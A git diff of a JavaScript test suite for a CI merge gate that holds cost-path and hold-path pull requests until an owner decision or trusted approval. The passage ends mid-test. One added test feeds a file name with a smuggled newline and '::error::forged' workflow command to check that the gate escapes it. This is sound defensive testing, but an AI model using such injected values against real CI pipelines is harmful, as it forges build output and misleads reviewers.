@@ -1,27 +1,12 @@
-// Expected values come from the issue that added these holds and the gate's
-// own rules: the merge gate holds a change to a cost path
-// (diff_risk.COST_PATHS) until the owner's cost decision, which
-// babysit_merge_policy.cost_decision reads and test_babysit_merge_cost.py
-// pins case by case. ci-status names its owner by the trusted-actor list, as
-// its cost-only review hold step does, so a review approval lifts a hold path
-// but never a cost hold. A decision binds to one pull request: one on the pull
-// request counts as it is, one on its linked issue (closing, else `Refs:`)
-// only when it names `#<number>`. It covers the head it decided, the sha of the
-// newest cost hold notice a review lane's status job recorded before it on a
-// run vetted not to change a review-lane workflow (#9635), while the head
-// branch's push history shows a run of every lane on each head pushed since
-// it before the decision (#10437), and a later head
-// only when the net change against the base branch is the same at both (owner
-// decisions Q17 c and Q18 d on #9436).
 import assert from "node:assert/strict";
-import { Buffer } from "node:buffer";
-import { writeFileSync } from "node:fs";
+import { readFileSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { test } from "node:test";
 
 import * as holdsModule from "./merge-holds.mjs";
-import { BODY_WRITERS_QUERY, CARRY_REFUSES, COMMENT_EDITED_QUERY, approvalCarry, ungatedSince, HOLD_PATH_CLASSES, HOLD_PATH_FLOOR, PULL_OPENED_QUERY, REVIEW_FLOOR, baseMergeCarry, baseMergesOnly, changeOf, mergedParents, costDecision, costHold, costNotices, decidedHead, decisionGaps, evidenceHold, fromRest, holds, laneChange, linkHold, main, passRefusalOf, pathHold, PIN_RE, pinHold, sameNetChange, unranHead, withPinEdit } from "./merge-holds.mjs";
+import { CARRY_REFUSES, COMMENT_EDITED_QUERY, approvalCarry, ungatedSince, HOLD_PATH_CLASSES, HOLD_PATH_FLOOR, PULL_OPENED_QUERY, REVIEW_FLOOR, baseMergeCarry, baseMergesOnly, changeOf, mergedParents, costDecision, costHold, costNotices, decidedHead, decisionGaps, evidenceHold, fromRest, holds, laneChange, laneChangeIn, linkHold, main, passRefusalOf, pathHold, PIN_RE, pinHold, sameNetChange, unranHead, withPinEdit, diffFiles, needsDiff, DIFF, wholeCompare } from "./merge-holds.mjs";
 import { tempDir } from "../../../lib/test-tmp.mjs";
+import { chain, DIFF_TEXT, LISTED, modifiedAs, PAGE_TWO } from "./capped-compare.fixture.mjs";
 
 const REPO = "owner/repo";
 const LINK = "https://github.com/owner/repo/issues/40#issuecomment-7";
@@ -57,8 +42,7 @@ const history = (sha, answer) => {
   return { ...answer, commits, total_commits: commits.length };
 };
 
-const ROW = "https://github.com/melodic-software/architecture/blob/main/docs/owner-decisions.md#L10";
-const PROOF = `\n\nRow: ${ROW}\nOwner, verbatim: "Approve it."`;
+const PROOF = '\n\nOwner, verbatim: "Approve it."';
 const comment = (changes = {}) => ({
   issue_url: "https://api.github.com/repos/owner/repo/issues/40",
   user: { login: "owner-person", id: 5, type: "User" },
@@ -80,12 +64,23 @@ function world({
   compares = {},
   base = "main",
   activity = pushesOf(runs),
+  listings = {},
+  diffs = {},
+  changed,
 } = {}) {
   const reads = [];
   const answers = { ...Object.fromEntries(runs.map((run) => [run.sha, net(TF)])), ...compares };
-  const github = async (method, path, body) => {
-    // The activity API pages by the `after` cursor its Link header names,
-    // 100 entries a page; it ignores `page`.
+  const github = async (method, path, body, headers) => {
+    if (headers?.Accept === DIFF) {
+      const sha = /^\/repos\/owner\/repo\/compare\/[0-9a-f]{40}\.\.\.([0-9a-f]{40})$/.exec(path)?.[1];
+      reads.push(`diff ${sha}`);
+      if (!(sha in diffs)) throw new Error(`GET ${path} failed with status 404`);
+      return diffs[sha];
+    }
+    if (path === "/repos/owner/repo/pulls/99") {
+      reads.push("pull 99");
+      return { changed_files: changed };
+    }
     const moves = /^\/repos\/owner\/repo\/activity\?ref=refs%2Fheads%2Ffix%2Fcost&direction=desc&per_page=100(?:&after=c([0-9]+))?$/.exec(path);
     if (moves) {
       const page = Number(moves[1] ?? 1);
@@ -100,6 +95,12 @@ function world({
       const link = activity.length > page * 100 ? `<https://api.github.com/repositories/1/activity?per_page=100&after=c${page + 1}>; rel="next"` : null;
       return Object.defineProperty(rows, Symbol.for("github.link"), { value: link });
     }
+    const listed = /^\/repos\/owner\/repo\/contents\/\.github\/workflows\?ref=([0-9a-f]{40})$/.exec(path)?.[1];
+    if (listed !== undefined) {
+      reads.push(`listing ${listed}`);
+      if (!(listed in listings)) throw new Error(`GET ${path} failed with status 404`);
+      return structuredClone(listings[listed]);
+    }
     if (path.startsWith("/repos/owner/repo/git/ref/heads/")) {
       reads.push("ref");
       if (fail === "ref") throw new Error("ref failed");
@@ -110,7 +111,7 @@ function world({
       reads.push(`base ${parent[1]}`);
       return { status: parent[1] === MAIN ? "ahead" : "diverged" };
     }
-    const compare = /^\/repos\/owner\/repo\/compare\/(.+)\.\.\.([0-9a-f]{40})$/.exec(path);
+    const compare = /^\/repos\/owner\/repo\/compare\/(.+)\.\.\.([0-9a-f]{40})(?:\?per_page=100&page=([0-9]+))?$/.exec(path);
     const listing = /^\/repos\/owner\/repo\/actions\/workflows\/([a-z-]+\.yml)\/runs\?event=pull_request&branch=fix%2Fcost&per_page=100&page=1$/.exec(path);
     const jobs = /^\/repos\/owner\/repo\/actions\/runs\/([0-9]+)\/jobs\?filter=all&per_page=100&page=1$/.exec(path);
     const notes = /^\/repos\/owner\/repo\/check-runs\/([0-9]+)\/annotations\?per_page=100&page=1$/.exec(path);
@@ -126,7 +127,7 @@ function world({
               : notes
                 ? `notes ${notes[1]}`
                 : compare
-                  ? `compare ${compare[2]}`
+                  ? `compare ${compare[2]}${compare[3] ? ` page ${compare[3]}` : ""}`
                   : `${method} ${path}`;
     reads.push(read);
     if (read === fail) {
@@ -147,7 +148,10 @@ function world({
       if (!(compare[2] in answers)) {
         throw new Error("no such commit");
       }
-      return history(compare[2], answers[compare[2]]);
+      const answer = history(compare[2], answers[compare[2]]);
+      if (!Array.isArray(answer?.commits)) return answer;
+      const page = Number(compare[3] ?? 0);
+      return { ...answer, commits: page ? answer.commits.slice((page - 1) * 100, page * 100) : answer.commits.slice(0, 250) };
     }
     if (read === "pull") {
       assert.deepEqual(body.variables, { owner: "owner", name: "repo", number: 99 });
@@ -281,7 +285,7 @@ test("a decision line after leading blank lines still counts", async () => {
   assert.equal((await decide(undefined, { row: comment({ body: `\n  **Decision recorded.**\tCost: yes for #99${PROOF}` }) })).link, LINK);
 });
 
-test("a cost decision clears only with a row link and a verbatim owner quote, and says which it lacks", async () => {
+test("a cost decision clears only with a verbatim owner quote, and says when it lacks one", async () => {
   const lacks = async (body) => {
     const missing = [];
     const { github } = world({ row: comment({ body }) });
@@ -290,37 +294,16 @@ test("a cost decision clears only with a row link and a verbatim owner quote, an
   };
   const line = "**Decision recorded.** Cost: approve it for #99.";
   const quote = 'Owner, verbatim: "Approve it."';
-  const sha = "0123456789abcdef0123456789abcdef01234567";
-  for (const row of [ROW, `https://github.com/melodic-software/architecture/blob/${sha}/docs/owner-decisions.md#L12`, `${ROW}-L14`, ROW.replace(".md#", ".md?plain=1#")]) {
-    assert.deepEqual(await lacks(`${line}\n${row}\n${quote}`), { link: LINK, missing: [] }, row);
-  }
+  assert.deepEqual(await lacks(`${line}\n${quote}`), { link: LINK, missing: [] });
   for (const text of ['Owner\'s answer, verbatim: "yes go w/ recommendations"', 'Owner, typed in a session, verbatim: "Go with recommendations."']) {
-    assert.equal((await lacks(`${line}\n${ROW}\n${text}`)).link, LINK, text);
+    assert.equal((await lacks(`${line}\n${text}`)).link, LINK, text);
   }
-  const noRow = await lacks(`${line}\n${quote}`);
-  assert.equal(noRow.link, null);
-  assert.equal(noRow.missing.length, 1);
-  assert.match(noRow.missing[0], /owner-decisions record/);
-  const noQuote = await lacks(`${line}\n${ROW}`);
+  const noQuote = await lacks(line);
   assert.equal(noQuote.link, null);
   assert.equal(noQuote.missing.length, 1);
   assert.match(noQuote.missing[0], /verbatim/);
-  assert.equal((await lacks(line)).missing.length, 2);
-  for (const row of [
-    ROW.replace("#L10", ""),
-    ROW.replace("#L10", "#L0"),
-    ROW.replace("/blob/main/", "/blob/feature/"),
-    ROW.replace("/blob/main/", "/blob/0123abc/"),
-    ROW.replace("melodic-software/architecture", "evil/architecture"),
-    ROW.replace("owner-decisions.md", "decisions.md"),
-    ROW.replace("https://github.com", "https://example.com"),
-    `<!-- ${ROW} -->`,
-    `<!--\n${ROW}`,
-  ]) {
-    assert.equal((await lacks(`${line}\n${row}\n${quote}`)).link, null, row);
-  }
   for (const text of ['verbatim: ""', 'verbatim: "  "', "verbatim: yes", 'verbatim:\n"yes"', `<!-- ${quote} -->`, 'Owner, quoted: "yes"', 'The owner, verbatim as typed: "yes"']) {
-    assert.equal((await lacks(`${line}\n${ROW}\n${text}`)).link, null, text);
+    assert.equal((await lacks(`${line}\n${text}`)).link, null, text);
   }
   const missing = [];
   const { github } = world({ row: comment({ body: line, performed_via_github_app: { slug: "x" } }) });
@@ -328,7 +311,7 @@ test("a cost decision clears only with a row link and a verbatim owner quote, an
   assert.deepEqual(missing, []);
 });
 
-test("the row and quote only tighten: with both present, every older failing condition still holds", async () => {
+test("the quote only tightens: with it present, every older failing condition still holds", async () => {
   for (const [name, options] of Object.entries({
     "posted through an App": { row: comment({ performed_via_github_app: { slug: "cursor" } }) },
     edited: { node: { lastEditedAt: "2026-10-22T13:00:00Z" } },
@@ -344,17 +327,17 @@ test("the row and quote only tighten: with both present, every older failing con
 });
 
 test("decisionGaps reads outside HTML comments and names each gap once", () => {
-  assert.deepEqual(decisionGaps(`x\n${ROW}\nverbatim: "y"`), []);
-  assert.equal(decisionGaps(`<!-- ${ROW}\nverbatim: "y" -->`).length, 2);
-  assert.equal(decisionGaps(null).length, 2);
+  assert.deepEqual(decisionGaps('x\nverbatim: "y"'), []);
+  assert.equal(decisionGaps('<!-- verbatim: "y" -->').length, 1);
+  assert.equal(decisionGaps(null).length, 1);
 });
 
 test("the cost hold's reason names what the linked decision comment lacks", () => {
-  const [reason] = holds("", [], ["infra/main.tf"], [], [], null, true, null, true, ["a row link"]);
-  assert.match(reason, /owner-decisions record and the owner's words quoted verbatim/);
-  assert.match(reason, /the linked decision comment lacks a row link$/);
-  assert.doesNotMatch(holds("", [], ["infra/main.tf"], [], [], null)[0], /lacks/);
-  assert.deepEqual(holds("", [], ["infra/main.tf"], [], [], LINK), []);
+  const [reason] = holds(["infra/main.tf"], [], [], null, true, ["a verbatim quote"]);
+  assert.match(reason, /the owner's words quoted verbatim/);
+  assert.match(reason, /the linked decision comment lacks a verbatim quote$/);
+  assert.doesNotMatch(holds(["infra/main.tf"], [], [], null)[0], /lacks/);
+  assert.deepEqual(holds(["infra/main.tf"], [], [], LINK), []);
 });
 
 test("costHold holds a cost path, case-folded, until a decision", () => {
@@ -367,7 +350,7 @@ test("costHold holds a cost path, case-folded, until a decision", () => {
 });
 
 const BASELINE = "docs/upstream/claude-code-native-surfaces.min.json";
-function ci(files, { reviews = [], body = "Closes #40", options, denied = [], writers = "fail", head = HEAD, list = {}, queue, pull, baselineFile = BASELINE } = {}) {
+function ci(files, { reviews = [], body = "Closes #40", options, denied = [], head = HEAD, queue, pull, baselineFile = BASELINE } = {}) {
   const dir = tempDir("merge-holds-");
   const env = pull === undefined ? {} : { BABYSIT_VERIFY_PULL: join(dir, "pull"), LANES_APP_ID: "9", ...(baselineFile === null ? {} : { BASELINE_FILE: baselineFile }) };
   if (pull !== undefined) {
@@ -389,25 +372,7 @@ function ci(files, { reviews = [], body = "Closes #40", options, denied = [], wr
       argv.push(join(dir, "evidence"));
     }
   }
-  const { github: decisions } = world(options);
-  const github = async (method, path, data) => {
-    const listed = /^\/repos\/owner\/repo\/contents\/\.github\/standards\/trusted-actors\/trusted-actors\.json\?ref=([0-9a-f]{40})$/.exec(path);
-    if (listed) {
-      assert.equal(method, "GET");
-      if (!(listed[1] in list)) {
-        throw new Error("not found");
-      }
-      return { type: "file", encoding: "base64", content: Buffer.from(list[listed[1]]).toString("base64") };
-    }
-    if (data?.query !== BODY_WRITERS_QUERY) {
-      return decisions(method, path, data);
-    }
-    assert.deepEqual(data.variables, { owner: "owner", name: "repo", number: 99 });
-    if (writers === "fail") {
-      throw new Error("unreadable");
-    }
-    return { data: { repository: { pullRequest: writers } } };
-  };
+  const { github } = world(options);
   const lines = [];
   const log = console.log;
   console.log = (line) => lines.push(line);
@@ -425,6 +390,7 @@ function ci(files, { reviews = [], body = "Closes #40", options, denied = [], wr
 const approve = { user: { login: "owner-person", id: 5, type: "User" }, state: "APPROVED", commit_id: HEAD, submitted_at: "2026-10-23T11:00:00Z" };
 
 const FLOOR_FILES = [
+  "plugins/source-control/skills/babysit-prs/scripts/babysit_verify_evidence.py",
   ".github/actions/resolve-config/resolve.mjs",
   ".github/actions/Resolve-Config/lane-rules.json",
   ".github/actions/request-lane-token/action.yml",
@@ -440,6 +406,7 @@ const FLOOR_FILES = [
   ".github/scripts/pr-merge/enable-auto-merge.mjs",
   ".github/scripts/pr-merge/superseded.mjs",
   ".github/scripts/pr-merge/clear-escalations.mjs",
+  ".github/scripts/pr-merge/verifier.mjs",
   ".github/scripts/pr-merge/gate-check.mjs",
   ".github/scripts/pr-merge/who.mjs",
   ".github/scripts/pr-merge/rate-stop.bash",
@@ -451,7 +418,7 @@ const FLOOR_FILES = [
   "docs/conventions/pr-pipeline.yaml",
 ];
 const ENFORCEMENT_FILES = [
-  "plugins/source-control/skills/babysit-prs/scripts/babysit_verify_evidence.py",
+  "plugins/source-control/skills/babysit-prs/scripts/babysit_whole_review.py",
   "plugins/source-control/skills/babysit-prs/scripts/babysit_gh.py",
   ".github/scripts/pr-unblock/address-feedback.mjs",
   ".github/scripts/pr-unblock/escalation-routes.mjs",
@@ -496,6 +463,13 @@ test("ci-status leaves an enforcement path to the merge gate's security review",
   assert.equal(both.code, 1, both.out);
   assert.ok(both.out.includes("it changes .github/scripts/pr-merge/who.mjs, a hold path"), both.out);
 });
+test("a held file name from the PR head cannot start its own workflow command line", async () => {
+  const held = await ci([{ filename: ".github/actions/resolve-config/a%\n::error::forged", status: "modified" }]);
+  assert.equal(held.code, 1, held.out);
+  assert.doesNotMatch(held.out, /^::error::forged/m);
+  assert.ok(held.out.includes(".github/actions/resolve-config/a%25%0A::error::forged"), held.out);
+});
+
 test("ci-status holds each floor path with no configured glob, until a trusted person approves the head", async () => {
   for (const path of FLOOR_FILES) {
     const held = await ci([{ filename: path, status: "modified" }]);
@@ -524,53 +498,31 @@ test("ci-status holds no other trusted path or manifest change, only a configure
   ]) {
     const passed = await ci([{ filename: path, status: "modified" }]);
     assert.equal(passed.code, 0, `${path}: ${passed.out}`);
-    assert.match(passed.out, /no member veto and no hold path\./);
+    assert.match(passed.out, /no hold path\./);
   }
   const held = await ci([{ filename: "docs/held.md", status: "modified" }], { denied: ["docs/held.md"] });
   assert.equal(held.code, 1);
   assert.match(held.out, /it changes docs\/held\.md, a hold path/);
 });
 
-const ACTORS = ".github/standards/trusted-actors/trusted-actors.json";
-const KYLE = { id: 1, login: "kyle", kind: "human" };
-const LANES = { id: 2, login: "lanes[bot]", kind: "bot" };
-const listOf = (...actors) => `${JSON.stringify({ version: 1, actors }, null, 2)}\n`;
-test("ci-status holds a trusted-actor list widening until a trusted person approves the head, and passes a removal", async () => {
-  const modified = [{ filename: ACTORS, status: "modified" }];
-  const list = { [BASE]: listOf(KYLE), [HEAD]: listOf(KYLE, LANES) };
-  const widened = await ci(modified, { list });
-  assert.equal(widened.code, 1, widened.out);
-  assert.match(widened.out, /it widens the trusted-actor list \(\.github\/standards\/trusted-actors\/trusted-actors\.json: entries added or changed: .*lanes\[bot\].*\); an approving review of this head by a person on the trusted-actor list lifts it/);
-  const approved = await ci(modified, { list, reviews: [approve] });
-  assert.equal(approved.code, 0, approved.out);
-  assert.match(approved.out, /owner-person approved this head, which lifts its trusted-actor list hold/);
-  const stranger = { ...approve, user: { login: "stranger", id: 9, type: "User" } };
-  assert.equal((await ci(modified, { list, reviews: [stranger] })).code, 1);
-  const changed = await ci(modified, { list: { [BASE]: listOf(KYLE, LANES), [HEAD]: listOf(KYLE, { ...LANES, kind: "human" }) } });
-  assert.equal(changed.code, 1, changed.out);
-  const removed = await ci(modified, { list: { [BASE]: listOf(KYLE, LANES), [HEAD]: listOf(KYLE) } });
-  assert.equal(removed.code, 0, removed.out);
-  assert.match(removed.out, /no member veto and no hold path\./);
-  assert.equal((await ci(modified, { list: { [BASE]: listOf(KYLE, LANES) } })).code, 1);
-  assert.equal((await ci(modified, { list: { [BASE]: listOf(KYLE, LANES), [HEAD]: listOf(KYLE).replace('"version": 1', '"version": 1, "version": 1') } })).code, 1);
-  assert.equal((await ci([[ACTORS, ".github/standards/trusted-actors/old.json", "renamed"]], { list: { [BASE]: listOf(KYLE), [HEAD]: listOf(KYLE) } })).code, 1);
+test("ci-status holds no change to the retired synced trusted-actor list path: the list is read from standards", async () => {
+  const path = ".github/standards/trusted-actors/trusted-actors.json";
+  for (const change of [{ filename: path, status: "modified" }, { filename: path, status: "added" }, [path, ".github/standards/trusted-actors/old.json", "renamed"]]) {
+    const passed = await ci([change]);
+    assert.equal(passed.code, 0, passed.out);
+    assert.match(passed.out, /no hold path\./);
+  }
 });
 
-test("ci-status holds no body hold text, even a person's; a hold path or a member's veto still holds", async () => {
+test("ci-status holds on no body text or member comment; a hold path still holds", async () => {
   const body = "Closes #40\n\nHold: wait for the release.\n\ndo not merge";
-  const person = { __typename: "User" };
-  const written = await ci(["docs/a.md"], { body, writers: { author: person, userContentEdits: { totalCount: 0, nodes: [] } } });
+  const veto = { id: 1, user: { login: "kyle", id: 7, type: "User" }, author_association: "MEMBER", created_at: "2026-10-23T10:00:00Z", body: "Please do not merge this yet." };
+  const written = await ci(["docs/a.md"], { body, reviews: [veto] });
   assert.equal(written.code, 0, written.out);
   assert.match(written.out, /^#99: no member veto and no hold path\.$/m);
-  const pathed = await ci(["docs/held.md"], { body, denied: ["docs/held.md"] });
+  const pathed = await ci(["docs/held.md"], { body, reviews: [veto], denied: ["docs/held.md"] });
   assert.equal(pathed.code, 1, pathed.out);
   assert.match(pathed.out, /it changes docs\/held\.md, a hold path/);
-  assert.doesNotMatch(pathed.out, /its body holds it/);
-  const veto = { id: 1, user: { login: "kyle", id: 7, type: "User" }, author_association: "MEMBER", created_at: "2026-10-23T10:00:00Z", body: "Please do not merge this yet." };
-  const vetoed = await ci(["docs/a.md"], { body, reviews: [veto] });
-  assert.equal(vetoed.code, 1, vetoed.out);
-  assert.match(vetoed.out, /kyle asked not to merge it/);
-  assert.doesNotMatch(vetoed.out, /its body holds it/);
 });
 
 test("ci-status holds a cost path that an approval does not lift, and the owner's decision does", async () => {
@@ -582,7 +534,7 @@ test("ci-status holds a cost path that an approval does not lift, and the owner'
   assert.match(approved.out, /a cost path/);
   const decided = await ci(["infra/main.tf"], { body: `Closes #40\n\n${LINK}` });
   assert.equal(decided.code, 0, decided.out);
-  assert.match(decided.out, /no member veto and no hold path\./);
+  assert.match(decided.out, /no hold path\./);
   assert.equal((await ci(["infra/main.tf"], { body: `Closes #40\n\n${LINK}`, options: { node: { lastEditedAt: "2026-10-22T13:00:00Z" } } })).code, 1);
 });
 
@@ -599,7 +551,6 @@ test("ci-status lifts a cost hold for the head the decision decided, and re-hold
   assert.match(unnamed.out, /on its linked issue naming this pull request/);
 });
 
-// The carry rule (#9436 Q18 d): the decided head is OLD, the current HEAD.
 const later = (compares, options = {}) => decide(undefined, { runs: [laneRun(OLD)], compares, ...options });
 
 test("a base merge after the decision carries it, and a pull request commit after it re-holds", async () => {
@@ -630,7 +581,7 @@ test("a conflict resolution, a rename or a status change that alters the net cha
   }
 });
 
-test("a compare of 300 files or more, a file with no patch, a filename listed twice, an unusable base name or a failed read carries nothing", async () => {
+test("a compare of 300 files or more whose diff does not read, a file with no patch, a filename listed twice, an unusable base name or a failed read carries nothing", async () => {
   const many = (n) => net(...Array.from({ length: n }, (_, i) => ({ filename: `f${i}`, status: "added", patch: "+x" })));
   assert.equal((await later({ [OLD]: many(299), [HEAD]: many(299) })).link, LINK);
   assert.equal((await later({ [OLD]: many(300), [HEAD]: many(300) })).link, null);
@@ -650,6 +601,23 @@ test("a compare of 300 files or more, a file with no patch, a filename listed tw
     assert.ok(!odd.reads.some((read) => read.startsWith("compare")), String(base));
   }
   assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(TF) }, { base: "release/2.x" })).link, LINK);
+});
+
+test("a base merge over a range past the compare's 250 commits and 300 files carries, read in pages and from the diffs", async () => {
+  const branch = chain(259, MAIN).map((commit, at) => (at === 258 ? { ...commit, sha: OLD } : commit));
+  const then = { ...net(TF), commits: branch, total_commits: 259 };
+  const now = { ...net(TF), commits: [...branch, { sha: HEAD, parents: [{ sha: OLD }, { sha: MAIN }] }], total_commits: 260 };
+  const long = await later({ [OLD]: then, [HEAD]: now });
+  assert.equal(long.link, LINK);
+  assert.deepEqual(long.reads.filter((read) => read.startsWith(`compare ${HEAD}`)), [`compare ${HEAD}`, `compare ${HEAD} page 1`, `compare ${HEAD} page 2`, `compare ${HEAD} page 3`]);
+  assert.equal((await later({ [OLD]: then, [HEAD]: { ...now, total_commits: 261 } })).link, null, "a page shorter than total_commits");
+  assert.equal((await later({ [OLD]: then, [HEAD]: now }, { fail: `compare ${HEAD} page 2` })).link, null, "a page that does not read");
+  const vetted = { [LISTED.merge_base_commit.sha]: LISTING.workflows, [OLD]: LISTING.workflows };
+  const wide = (diffs, changed) => later({ [OLD]: { ...then, ...LISTED, commits: branch, total_commits: 259 }, [HEAD]: { ...now, ...LISTED, commits: now.commits, total_commits: 260 } }, { listings: vetted, diffs, changed });
+  assert.equal((await wide({ [OLD]: DIFF_TEXT, [HEAD]: DIFF_TEXT }, 301)).link, LINK);
+  assert.equal((await wide({ [OLD]: DIFF_TEXT, [HEAD]: DIFF_TEXT }, 302)).link, null, "a diff naming fewer files than the pull request changes");
+  assert.equal((await wide({ [OLD]: DIFF_TEXT, [HEAD]: "not a diff" }, 301)).link, null, "a diff that does not parse");
+  assert.equal((await wide({ [OLD]: DIFF_TEXT }, 301)).link, null, "a diff that does not read");
 });
 
 test("at the decided head the decision carries with no net-change compare", async () => {
@@ -717,7 +685,7 @@ test("the decision is the newest on the pull request, else the newest on its lin
     return id ? rows[id] : base(method, path, data);
   };
   assert.equal(await costDecision(github, REPO, 99, `Closes #40\n${LINK}\n${onPull(9)}`, HUMANS, HEAD, github, missing), null);
-  assert.equal(missing.length, 2);
+  assert.equal(missing.length, 1);
   assert.equal(await pick(`Closes #40\n${LINK}`, [laneRun(HEAD)]), LINK);
 });
 
@@ -783,10 +751,6 @@ test("a lane run on a head that changes a review-lane workflow, or whose compare
   }
 });
 
-// #10437: a deleted lane run of a head pushed after the decided head, before
-// the decision, would make an older notice the decided head. The branch's
-// push history, which deleting a run leaves, shows that head, and it must
-// have a run of every review lane started before the decision.
 test("a head pushed between the decided head and the decision with no run of every lane keeps the hold", async () => {
   const NEW = "1111111111111111111111111111111111111111";
   const same = { [OLD]: net(TF), [HEAD]: net(TF) };
@@ -815,9 +779,6 @@ test("a head pushed between the decided head and the decision with no run of eve
   assert.equal((await carried(both, { message: "Not Found" })).link, null);
 });
 
-// A branch name recreated for each sync (chore/standards-sync, #10990) keeps
-// its whole history in the activity API, so the decided head's push can sit
-// past the first page of 100.
 test("the head branch's push history is read past its first page", async () => {
   const NEW = "1111111111111111111111111111111111111111";
   const same = { [OLD]: net(TF), [HEAD]: net(TF) };
@@ -880,6 +841,48 @@ test("unranHead names the first head pushed after the decided head with no run o
   assert.equal(unranHead([push(OLD, "2026-10-22T11:30:00Z"), ...moves], [[OLD], [OLD]], OLD, at), null);
 });
 
+const LISTING = JSON.parse(readFileSync(new URL("./fixtures/contents-listing.json", import.meta.url), "utf8"));
+const relisted = (entries, changes = {}) => entries.flatMap((entry) => (!(entry.name in changes) ? [entry] : changes[entry.name] === null ? [] : [{ ...entry, sha: changes[entry.name] }]));
+const MANY = Array.from({ length: 300 }, (_, i) => ({ filename: `f${i}` }));
+
+test("laneChangeIn reads a compare past its 300-file list as the review-lane workflows' blobs at the merge base and head", async () => {
+  const BASE = "3".repeat(40);
+  const AT = "4".repeat(40);
+  const many = { ...net(...MANY), merge_base_commit: { sha: BASE } };
+  const reader = (byRef) => {
+    const paths = [];
+    const read = async (method, path) => {
+      paths.push(path);
+      const ref = /^\/repos\/o\/r\/contents\/\.github\/workflows\?ref=([0-9a-f]{40})$/.exec(path)?.[1];
+      if (method !== "GET" || !(ref in byRef)) throw new Error(`GET ${path} failed with status 404`);
+      return structuredClone(byRef[ref]);
+    };
+    return { read, paths };
+  };
+  const same = reader({ [BASE]: LISTING.workflows, [AT]: relisted(LISTING.workflows, { "pr-merge.yml": "d".repeat(40) }) });
+  assert.equal(await laneChangeIn(same.read, "o/r", many, AT), null, "another workflow's change is not a lane change");
+  assert.equal(same.paths.length, 2, "one listing at each end");
+  const edited = reader({ [BASE]: LISTING.workflows, [AT]: relisted(LISTING.workflows, { "pr-review-security-hosted.yml": "e".repeat(40) }) });
+  assert.equal(await laneChangeIn(edited.read, "o/r", many, AT), "a review-lane workflow");
+  const added = reader({ [BASE]: relisted(LISTING.workflows, { "pr-review-hosted.yml": null }), [AT]: LISTING.workflows });
+  assert.equal(await laneChangeIn(added.read, "o/r", many, AT), "a review-lane workflow", "a lane workflow new since the merge base is a change");
+  assert.equal(await laneChangeIn(same.read, "o/r", { ...many, merge_base_commit: undefined }, AT), "too many files", "no merge base keeps the cap's answer");
+  await assert.rejects(laneChangeIn(reader({ [BASE]: LISTING.workflows }).read, "o/r", many, AT), /404/, "an unread listing decides nothing");
+  assert.equal(await laneChangeIn(same.read, "o/r", net(TF), AT), null);
+  assert.equal(same.paths.length, 2, "a listed compare reads no tree");
+});
+
+test("a cost decision carries to a lane run on a 300-file head whose review-lane workflows match at its merge base", async () => {
+  const BASE = "3".repeat(40);
+  const compares = { [HEAD]: { ...net(TF, ...MANY), merge_base_commit: { sha: BASE } } };
+  const unchanged = { [BASE]: LISTING.workflows, [HEAD]: relisted(LISTING.workflows, { "pr-merge.yml": "d".repeat(40) }) };
+  const carried = await decide(undefined, { compares, listings: unchanged });
+  assert.equal(carried.link, LINK, "the vetted head carries the decision");
+  assert.ok(carried.reads.includes(`listing ${BASE}`) && carried.reads.includes(`listing ${HEAD}`), carried.reads.join(", "));
+  const edited = { ...unchanged, [HEAD]: relisted(LISTING.workflows, { "pr-review-hosted.yml": "e".repeat(40) }) };
+  assert.equal((await decide(undefined, { compares, listings: edited })).link, null, "a changed lane workflow vets nothing");
+});
+
 test("laneChange, costNotices and decidedHead", () => {
   assert.equal(laneChange(net(TF)), null);
   assert.equal(laneChange(net({ filename: ".github/workflows/pr-review-hosted.yml" })), "a review-lane workflow");
@@ -912,6 +915,80 @@ test("sameNetChange compares filename, status, previous_filename and patch", () 
   assert.equal(sameNetChange(net(), net()), true);
   assert.equal(sameNetChange(net(TF), net({ ...TF, previous_filename: "x.tf" })), false);
   assert.equal(sameNetChange(null, net(TF)), false);
+});
+
+const DELETED = ".changes/user-interface/chore-comment-sweep-v060-a9938050.md";
+const ADDED = ".changes/ai-slop/chore-comment-sweep-rem-2-94b10088.md";
+const cutShort = (text, sections) => text.split(/^(?=diff --git )/m).slice(0, -sections).join("");
+const bumped = (text) => text.replace("+bump: patch\n", "+bump: minor\n");
+
+test("diffFiles reads every section of a compare's diff text in the compare file-list shape", () => {
+  const files = diffFiles(DIFF_TEXT);
+  assert.equal(files.length, 301);
+  const named = (name) => files.find((f) => f.filename === name);
+  assert.deepEqual(named(ADDED), { filename: ADDED, status: "added", modes: ["new file mode 100644"], patch: "@@ -0,0 +1,7 @@\n+---\n+bump: patch\n+---" });
+  assert.deepEqual(diffFiles("diff --git a/old.md b/new.md\nsimilarity index 100%\nrename from old.md\nrename to new.md\n"), [{ filename: "new.md", status: "renamed", previous_filename: "old.md", patch: "", modes: [] }]);
+  assert.equal(named(DELETED).status, "removed");
+  assert.ok(named(DELETED).patch.startsWith("@@ -1,5 +0,0 @@\n----\n-bump: none\n----"), "a removed `---` line stays in the hunk");
+});
+
+test("diffFiles refuses text it cannot name and keeps a binary file patchless", () => {
+  assert.equal(diffFiles(`index 1..2\n${DIFF_TEXT}`), null, "text before the first section");
+  assert.equal(diffFiles('diff --git "a/sp\\303\\251cial" "b/sp\\303\\251cial"\nindex 1..2 100644\n--- "a/sp\\303\\251cial"\n+++ "b/sp\\303\\251cial"\n@@ -1 +1 @@\n-a\n+b\n'), null, "a quoted path");
+  assert.equal(diffFiles("diff --git a/x b/x\nsome header\n"), null, "an unknown header line");
+  assert.deepEqual(diffFiles("diff --git a/logo.png b/logo.png\nindex 1..2 100644\nBinary files a/logo.png and b/logo.png differ\n"), [{ filename: "logo.png", status: "modified", modes: [] }]);
+  assert.deepEqual(diffFiles("diff --git a/run.sh b/run.sh\nold mode 100644\nnew mode 100755\n"), [{ filename: "run.sh", status: "changed", modes: ["old mode 100644", "new mode 100755"], patch: "" }]);
+});
+
+test("a listing at the compare API's 300 files is the same net change only on its two diffs", () => {
+  assert.equal(LISTED.files.length, 300);
+  assert.equal(needsDiff(LISTED), true);
+  assert.equal(needsDiff(net(TF)), false);
+  assert.equal(sameNetChange(LISTED, LISTED), false, "the listing alone may hide a file");
+  assert.equal(sameNetChange(LISTED, LISTED, [DIFF_TEXT, DIFF_TEXT]), true);
+  assert.notEqual(bumped(DIFF_TEXT), DIFF_TEXT);
+  assert.equal(sameNetChange(LISTED, LISTED, [DIFF_TEXT, bumped(DIFF_TEXT)]), false, "one changed line");
